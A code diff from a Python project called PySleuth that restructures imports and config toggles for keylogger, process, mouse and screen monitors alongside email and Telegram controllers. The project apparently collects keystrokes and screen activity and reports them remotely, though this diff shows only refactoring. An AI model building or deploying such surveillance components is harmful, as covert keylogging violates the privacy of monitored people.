@@ -1,11 +1,8 @@
-from .core.data import Data
-from .config import ConfigHandler
-from .controllers import KeyLoggerController
-from .controllers import ProcessMntrController
-from .controllers import MouseMntrController
-from .controllers import ScreenMntrController
-from .controllers import EmailController
-from .controllers import TelegramController
+from .controllers.components import KeyLoggerController, ProcessMntrController, MouseMntrController, ScreenMntrController
+from .controllers.email import EmailController
+from .controllers.telegram import TelegramController
+
+from . import config
 
 
 class Struct:
@@ -50,18 +47,18 @@ class PySleuth:
         self.telegramCtrl.SIG_shutdown.connect(self, "onShutdown")
 
     def _initComponents(self):
-        components = ConfigHandler().getCfgRun()
+        cfg = config.get()
 
-        if components.getboolean("keylogger"):
+        if cfg.keylogger.enable:
             self._initKeylogger()
 
-        if components.getboolean("process-monitor"):
+        if cfg.processMntr.enable:
             self._initProcessMonitor()
 
-        if components.getboolean("mouse-monitor"):
+        if cfg.mouseMntr.enable:
             self._initMouseMonitor()
 
-        if components.getboolean("screen-monitor"):
+        if cfg.screenMntr.enable:
             self._initScreenMonitor()
 
     def _initKeylogger(self):
